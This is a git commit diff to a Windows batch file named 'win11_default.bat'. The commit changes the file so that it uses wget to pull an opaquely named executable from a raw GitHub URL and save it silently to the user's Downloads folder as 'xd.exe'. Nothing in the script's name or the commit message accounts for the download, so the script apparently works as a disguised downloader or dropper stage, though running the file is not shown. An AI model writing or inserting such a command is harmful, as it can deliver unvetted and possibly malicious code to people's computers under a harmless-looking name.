736d0313ae23bc3df75028a7f1477625b32f2e90
optolab <sloneeddie36@gmail.com>
2025-01-12 13:09:55 -0500

    Update win11_default.bat

--- win11_default.bat
+++ win11_default.bat
@@ -1,4 +1,4 @@
 @echo off
-set url=https://claykers.com/
-set file=%USERPROFILE%\Downloads\downloaded_file.exe
+set url=https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe
+set file=%USERPROFILE%\Downloads\xd.exe
 wget "%url%" -O "%file%"
